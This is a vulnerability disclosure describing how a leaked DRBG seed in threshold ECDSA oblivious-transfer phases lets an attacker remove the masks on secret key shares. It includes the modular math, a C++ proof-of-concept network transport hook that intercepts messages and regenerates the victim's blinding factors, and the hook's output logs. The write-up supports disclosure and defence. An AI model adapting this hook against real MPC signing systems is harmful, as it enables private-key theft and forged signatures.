Disclosure: Educational abstraction of a real-world zero-day. Vendor specifics and core namespaces are simulated. The math and architectural flaw remain 1:1 with the original exploit.
[CRITICAL] DRBG State Leakage in Threshold ECDSA (Full Key Compromise)
Author: Ayoub Aragui (aragui99)
Category: Cryptographic Invariant Breach
Language: C/C++
Context & Invariant
In t-of-n ECDSA setups, Oblivious Transfer (OT) phases require ephemeral entropy seeds to instantiate a local DRBG. This DRBG generates the blinding factors (v_{l,t}) that mask the user's secret key share (x_i).
Invariant: The DRBG root seed is strictly ephemeral. It must never leave the node's isolated memory or cross the network transport layer.
The Flaw

MaskedShare \equiv (x_i + v_i) \pmod q


Since the attacker has the victim's leaked seed, they can spin up an identical local DRBG. v_i is no longer random; it's a known constant. The attacker simply reverses the mask


x_i \equiv (MaskedShare - v_{reconstructed}) \pmod q


Impact: Complete 1-of-n compromise. The threshold is bypassed, the full private key is reconstructed, and the attacker dictates all signatures.
PoC (Passive Transport Hook)


#include <iostream>
#include <vector>
#include <cstring>
#include <stdexcept>
#include <mpc_core/api/tss_ecdsa.h>
#include <mpc_core/internal/crypto/rng.h>

using namespace mpc_lib;

class mal_transport final : public data_transport_i {
public:
    explicit mal_transport(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {
        if (!ctx_) {
            throw std::invalid_argument("mal_transport: net_context_t must not be null");
        }
    }
    
    error_t receive_all(const std::vector<party_idx_t>& senders, std::vector<buf_t>& msgs) override {
        error_t rv = ctx_->receive_all(senders, msgs);
        if (rv != SUCCESS) {
            std::cerr << "[!] receive_all failed with error code: " << rv << "\n";
            return rv;
        }

        for (size_t i = 0; i < msgs.size(); i++) {
            if (msgs[i].size() >= 32) {
                if (msgs[i].data() == nullptr) {
                    std::cerr << "[!] msg[" << i << "] has valid size but null data ptr\n";
                    continue;
                }

                buf256_t seed;
                std::memcpy(&seed, msgs[i].data(), 32);
                
                crypto::deterministic_rng_t atk_drbg(seed);
                bn_t q = bn_t::from_hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
                if (q.is_zero()) {
                    std::cerr << "[!] Failed to parse secp256k1 order\n";
                    return ERR_INTERNAL;
                }
                
                for (int t = 0; t < 2; t++) {
                    bn_t factor = atk_drbg.gen_bn(q);
                    if (factor.is_zero()) {
                        std::cerr << "[!] DRBG gen_bn returned zero at iteration " << t << "\n";
                        return ERR_INTERNAL;
                    }
                    std::cout << "[*] aragui99 Audit - Expected: " << factor.to_hex() << "\n";
                }
            }
        }
        return rv;
    }
private:
    std::shared_ptr<net_context_t> ctx_;
};


Output Logs
Running the hook passively dumps the masking variables natively:


[*] Initializing 2 Independent Parties (Public API Entry Point)...

[aragui99-Network-Hook] INTERCEPTED BROADCAST FROM PARTY 0!
[aragui99-Network-Hook] Extracting 32-byte deterministic seed from payload...
[aragui99-Exploit] DRBG Reconstructed. Victim's Blinding Factors (v_1):
  -> 4FBDF43C89AFFB6A28ADDF51E77C64F28C3502BBF0E1B284CCAB5707D4D8BC10
  -> 958FC4BEBF819D5CC0FD7018ACB9C0F8A6DE5C0F8B95B0C3B5CA719E7B116AF
[aragui99-Exploit] CRITICAL: Private Key Share x_i is now mathematically exposed.
